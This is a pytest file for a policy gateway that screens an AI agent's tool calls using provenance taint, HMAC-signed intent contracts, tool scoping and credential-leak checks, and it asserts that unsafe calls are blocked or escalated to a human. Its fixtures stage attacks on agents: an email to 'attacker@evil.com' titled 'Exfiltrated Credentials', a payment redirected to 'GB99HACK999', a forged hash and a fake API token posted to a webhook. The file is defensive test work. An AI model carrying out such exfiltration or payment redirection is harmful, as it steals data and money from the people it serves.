"""
Task 16 Verification Tests: Deterministic Policy & Taint Verifier (HMAC-SHA256 + Pydantic IFC)
==============================================================================================
GENESIS 2.0 | Track: EVA 03 | PS 01 — IntentGuard

Tests:
1. Test 1: Authorized Tool Call with Trusted (TRUSTED_PO_DB / USER_AUTHORITY) Origins
2. Test 2: Pydantic IFC Blocks Outbound Recipient from UNTRUSTED_EXT (Risks #21, #27)
3. Test 3: Pydantic IFC Blocks Payment to beneficiary_iban from UNTRUSTED_EXT & Triggers Human Approval Card (Risks #10, #18)
4. Test 4: Tampered or Invalid Step-0 intent_hmac_hash Rejected (Risks #14, #30)
5. Test 5: Out-of-Scope Tool Not in Step0IntentContract.allowed_tools Blocked (Risks #16, #17)
6. Test 6: Credential & API Key Leakage in Tool Arguments Blocked (Risk #25)
7. Test 7: Direct ProvenanceEnvelope Objects Inside tool_arguments & FastAPI Hook 2 End-to-End Integration
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# Ensure backend directory is in sys.path
# ---------------------------------------------------------------------------
_BACKEND_DIR = Path(__file__).resolve().parent.parent
if str(_BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(_BACKEND_DIR))

from app.layer2_camel.intent_contract import (
    Step0IntentContract,
    compile_step0_intent_contract,
    intent_contract_registry,
)
from app.layer2_camel.provenance_wrapper import ProvenanceEnvelope
from app.layer3_policy.deterministic_gateway import (
    DeterministicPolicyGateway,
    PolicyEvaluationRequest,
    deterministic_policy_gateway,
)
from app.layer3_policy.resource_budget import resource_budget_enforcer
from app.main import app
from app.openclaw_bridge.interceptor import session_intent_contracts, session_taint_registry


@pytest.fixture
def client():
    """Create a fresh FastAPI TestClient for each test."""
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture(autouse=True)
def reset_all_state():
    """Reset all session registries and counters before each test."""
    session_taint_registry.clear()
    session_intent_contracts.clear()
    resource_budget_enforcer.sessions.clear()
    intent_contract_registry.clear()
    yield
    session_taint_registry.clear()
    session_intent_contracts.clear()
    resource_budget_enforcer.sessions.clear()
    intent_contract_registry.clear()


# ===========================================================================
# Test 1: Authorized Tool Call with Trusted Origins
# ===========================================================================

def test_01_authorized_tool_call_with_trusted_origins():
    """
    Create a valid Step0IntentContract allowing schedule_verified_payment up to ₹4,000.00.
    Pass beneficiary_iban='HDFC0001234_99887766' (origin='TRUSTED_PO_DB') and
    amount_inr=4000.0 (origin='TRUSTED_PO_DB').
    Assert:
    - execution_permitted is True
    - threat_detected is False
    - action_taken == 'SAFE_EXECUTED'
    - len(execution_token_hmac) == 64
    """
    session_id = "sess-task16-auth-01"
    contract = compile_step0_intent_contract(
        session_id=session_id,
        user_prompt="Approve verified payment for PO-402 up to ₹4,000",
        explicit_allowed_tools=["schedule_verified_payment"],
        explicit_max_amount_inr=4000.0,
    )
    intent_contract_registry.register_contract(contract)

    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="schedule_verified_payment",
        tool_arguments={
            "beneficiary_iban": "HDFC0001234_99887766",
            "amount_inr": 4000.0,
        },
        argument_provenance={
            "beneficiary_iban": "TRUSTED_PO_DB",
            "amount_inr": "TRUSTED_PO_DB",
        },
        provided_intent_hmac_hash=contract.intent_hmac_hash,
    )

    result = deterministic_policy_gateway.evaluate_tool_call(req)

    assert result.execution_permitted is True
    assert result.threat_detected is False
    assert result.action_taken == "SAFE_EXECUTED"
    assert result.execution_token_hmac is not None
    assert len(result.execution_token_hmac) == 64
    assert len(result.ifc_violations) == 0


# ===========================================================================
# Test 2: Pydantic IFC Blocks Outbound Recipient from UNTRUSTED_EXT
# ===========================================================================

def test_02_pydantic_ifc_blocks_outbound_recipient_from_untrusted_ext():
    """
    Call send_email with email_to='attacker@evil.com' carrying origin='UNTRUSTED_EXT'.
    Assert:
    - execution_permitted is False
    - action_taken == 'BLOCKED'
    - threat_detected is True
    - 21 in risk_category_ids
    - ifc_violations[0].sink_category == 'OUTBOUND_RECIPIENT_SINK'
    """
    session_id = "sess-task16-exfil-02"
    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="send_email",
        tool_arguments={
            "email_to": "attacker@evil.com",
            "subject": "Exfiltrated Credentials",
        },
        argument_provenance={
            "email_to": "UNTRUSTED_EXT",
            "subject": "USER_AUTHORITY",
        },
    )

    result = deterministic_policy_gateway.evaluate_tool_call(req)

    assert result.execution_permitted is False
    assert result.action_taken == "BLOCKED"
    assert result.threat_detected is True
    assert 21 in result.risk_category_ids
    assert len(result.ifc_violations) > 0
    assert result.ifc_violations[0].sink_category == "OUTBOUND_RECIPIENT_SINK"
    assert result.ifc_violations[0].arg_name == "email_to"


# ===========================================================================
# Test 3: Pydantic IFC Blocks Payment to beneficiary_iban from UNTRUSTED_EXT
# ===========================================================================

def test_03_pydantic_ifc_blocks_payment_to_untrusted_iban_triggers_human_approval():
    """
    Call schedule_verified_payment with beneficiary_iban='GB99HACK999' carrying origin='UNTRUSTED_EXT'.
    Assert:
    - execution_permitted is False
    - requires_human_approval_card is True
    - action_taken == 'HUMAN_APPROVAL_REQUIRED'
    - threat_detected is True
    - 18 in risk_category_ids
    """
    session_id = "sess-task16-iban-03"
    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="schedule_verified_payment",
        tool_arguments={
            "beneficiary_iban": "GB99HACK999",
            "amount_inr": 2500.0,
        },
        argument_provenance={
            "beneficiary_iban": "UNTRUSTED_EXT",
            "amount_inr": "USER_AUTHORITY",
        },
    )

    result = deterministic_policy_gateway.evaluate_tool_call(req)

    assert result.execution_permitted is False
    assert result.requires_human_approval_card is True
    assert result.action_taken == "HUMAN_APPROVAL_REQUIRED"
    assert result.threat_detected is True
    assert 18 in result.risk_category_ids
    assert len(result.ifc_violations) > 0
    assert result.ifc_violations[0].sink_category == "FINANCIAL_DESTINATION_SINK"


# ===========================================================================
# Test 4: Tampered or Invalid Step-0 intent_hmac_hash Rejected
# ===========================================================================

def test_04_tampered_or_invalid_intent_hmac_hash_rejected():
    """
    Pass a forged or modified 64-char provided_intent_hmac_hash that does not match
    the Step0IntentContract payload.
    Assert:
    - execution_permitted is False
    - action_taken == 'BLOCKED'
    - 30 in risk_category_ids
    """
    session_id = "sess-task16-hmac-04"
    contract = compile_step0_intent_contract(
        session_id=session_id,
        user_prompt="Schedule approved vendor payment up to ₹5,000",
        explicit_allowed_tools=["schedule_payment"],
    )
    intent_contract_registry.register_contract(contract)

    # Forged hash of 64 hex characters
    forged_hash = "deadbeef" * 8

    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="schedule_payment",
        tool_arguments={"amount_inr": 100.0},
        provided_intent_hmac_hash=forged_hash,
    )

    result = deterministic_policy_gateway.evaluate_tool_call(req)

    assert result.execution_permitted is False
    assert result.action_taken == "BLOCKED"
    assert result.threat_detected is True
    assert 30 in result.risk_category_ids
    assert len(result.ifc_violations) > 0
    assert result.ifc_violations[0].sink_category == "HMAC_MISMATCH"


# ===========================================================================
# Test 5: Out-of-Scope Tool Not in allowed_tools Blocked
# ===========================================================================

def test_05_out_of_scope_tool_blocked():
    """
    Contract only allows ['read_invoice_pdf', 'match_purchase_order'], but agent
    attempts to call 'export_database' or 'delete_file'.
    Assert:
    - execution_permitted is False
    - action_taken == 'BLOCKED'
    - 16 in risk_category_ids
    """
    session_id = "sess-task16-scope-05"
    contract = compile_step0_intent_contract(
        session_id=session_id,
        user_prompt="Read invoice and match with purchase order",
        explicit_allowed_tools=["read_invoice_pdf", "match_purchase_order"],
    )
    intent_contract_registry.register_contract(contract)

    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="export_database",
        tool_arguments={"target_table": "vendor_bank_accounts"},
        provided_intent_hmac_hash=contract.intent_hmac_hash,
    )

    result = deterministic_policy_gateway.evaluate_tool_call(req)

    assert result.execution_permitted is False
    assert result.action_taken == "BLOCKED"
    assert result.threat_detected is True
    assert 16 in result.risk_category_ids
    assert len(result.ifc_violations) > 0
    assert result.ifc_violations[0].sink_category == "PROHIBITED_TOOL"


# ===========================================================================
# Test 6: Credential Leakage in Tool Arguments Blocked
# ===========================================================================

def test_06_credential_leakage_in_tool_arguments_blocked():
    """
    Pass a tool call where an argument contains 'gsk_1234567890abcdefghijklmnop'.
    Assert:
    - execution_permitted is False
    - action_taken == 'BLOCKED'
    - 25 in risk_category_ids
    """
    session_id = "sess-task16-leak-06"
    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="webhook_post",
        tool_arguments={
            "payload": "Secret token is gsk_1234567890abcdefghijklmnop for admin access",
        },
        argument_provenance={"payload": "USER_AUTHORITY"},
    )

    result = deterministic_policy_gateway.evaluate_tool_call(req)

    assert result.execution_permitted is False
    assert result.action_taken == "BLOCKED"
    assert result.threat_detected is True
    assert 25 in result.risk_category_ids
    assert len(result.ifc_violations) > 0
    assert result.ifc_violations[0].sink_category == "CREDENTIAL_LEAK_SINK"


# ===========================================================================
# Test 7: Direct ProvenanceEnvelope Objects & FastAPI Hook 2 Integration
# ===========================================================================

def test_07_provenance_envelope_and_fastapi_hook2_integration(client: TestClient):
    """
    Verify both direct ProvenanceEnvelope instances inside tool_arguments and
    FastAPI POST /internal/intercept/tool requests work end-to-end.
    """
    session_id = "sess-task16-hook2-07"

    # Step A: Direct ProvenanceEnvelope resolution in DeterministicPolicyGateway
    env_iban = ProvenanceEnvelope(
        value="GB99HACK999",
        origin="UNTRUSTED_EXT",
        source_reference="invoice_payload.pdf",
    )
    env_amount = ProvenanceEnvelope(
        value=1500.0,
        origin="USER_AUTHORITY",
    )

    req = PolicyEvaluationRequest(
        session_id=session_id,
        tool_name="schedule_verified_payment",
        tool_arguments={
            "beneficiary_iban": env_iban,
            "amount_inr": env_amount,
        },
    )
    result = deterministic_policy_gateway.evaluate_tool_call(req)
    assert result.execution_permitted is False
    assert result.requires_human_approval_card is True
    assert result.action_taken == "HUMAN_APPROVAL_REQUIRED"
    assert 18 in result.risk_category_ids

    # Step B: Register intent via POST /internal/intercept/register-intent
    contract = compile_step0_intent_contract(
        session_id=session_id,
        user_prompt="Schedule verified payment up to ₹3,000",
        explicit_allowed_tools=["schedule_verified_payment"],
        explicit_max_amount_inr=3000.0,
    )
    reg_resp = client.post("/internal/intercept/register-intent", json=contract.model_dump())
    assert reg_resp.status_code == 200
    assert reg_resp.json()["status"] == "registered"

    # Step C: End-to-end Hook 2 HTTP POST /internal/intercept/tool with trusted args
    hook2_payload = {
        "session_id": session_id,
        "tool_name": "schedule_verified_payment",
        "tool_arguments": {
            "beneficiary_iban": "HDFC0001234_99887766",
            "amount_inr": 2000.0,
        },
        "argument_provenance": {
            "beneficiary_iban": "TRUSTED_PO_DB",
            "amount_inr": "TRUSTED_PO_DB",
        },
        "intent_hmac_hash": contract.intent_hmac_hash,
    }
    resp = client.post("/internal/intercept/tool", json=hook2_payload)
    assert resp.status_code == 200
    data = resp.json()

    assert data["execution_permitted"] is True
    assert data["action_taken"] == "SAFE_EXECUTED"
    assert data["threat_detected"] is False
    assert data["execution_token_hmac"] is not None
    assert len(data["execution_token_hmac"]) == 64
